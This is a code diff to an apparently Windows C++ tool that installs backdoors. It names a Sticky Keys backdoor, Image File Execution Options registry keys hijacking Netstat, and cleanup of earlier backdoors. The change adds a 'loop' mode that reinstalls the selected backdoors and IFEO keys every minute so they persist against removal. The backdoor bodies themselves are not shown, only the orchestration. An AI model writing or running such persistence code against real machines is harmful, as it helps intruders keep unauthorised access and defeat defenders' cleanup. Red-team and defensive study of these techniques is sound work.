@@ -3,6 +3,8 @@
 #include <fstream>
 #include <vector>
 #include <string>
+#include <thread>
+#include <chrono>
 
 #include <iostream>
 
@@ -187,7 +189,7 @@ void ifeo_keys() {
     std::cout << "\033[1;32m\tAdded Netstat IFEO Registry Key\033[0m" << std::endl;
 }
 
-int main(int argc, char *argv[]){
+void startup() {
     //clears terminal
     error_handling(system("cls"), "cls");
 
@@ -206,9 +208,9 @@ int main(int argc, char *argv[]){
     //cleans up previous runs beforehand
     std::cout << "Cleaning Up Previous Backdoors..." << std::endl;
     cleanup();
+}
 
-    //executes selected backdoors
-    std::cout << "Executing Backdoors..." << std::endl;
+void execute_backdoors(int argc, char *argv[]) {
     if (argc == 1) {
         sticky_keys();
         std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
@@ -249,10 +251,43 @@ int main(int argc, char *argv[]){
             }
         }
     }
+}
+
+int main(int argc, char *argv[]){
+    startup(); //runs basic startup (clear, ascii art, admin perms, hotkeys, cleanup)
+
+    bool shouldLoop = false;
+    //parses through arguments to check for the loop parameter
+     for (int i = 1; i < argc; i++) {
+        if (std::string(argv[i]) == "loop" || std::string(argv[i]) == "Loop") {
+            shouldLoop = true;
+            //remove the "loop" argument by shifting the rest of the arguments
+            for (int j = i; j < argc - 1; j++) {
+                argv[j] = argv[j + 1];
+            }
+            argc--;
+            break; 
+        }
+    }
+
+    //executes selected backdoors
+    std::cout << "Executing Backdoors..." << std::endl;
+    execute_backdoors(argc, argv);
 
     //sets IFEO registry keys
     std::cout << "Adding IFEO Registry Keys..." << std::endl;
     ifeo_keys();
+
+    //loops if loop parameter is present
+    while (shouldLoop) {
+        std::cout << "\033[1;33mSleeping for 1 minute before re-running...\033[0m" << std::endl;
+        std::this_thread::sleep_for(std::chrono::minutes(1));
+        startup();
+        std::cout << "Executing Backdoors..." << std::endl;
+        execute_backdoors(argc, argv);
+        std::cout << "Adding IFEO Registry Keys..." << std::endl;
+        ifeo_keys();
+    }
 
     return 0;
 }
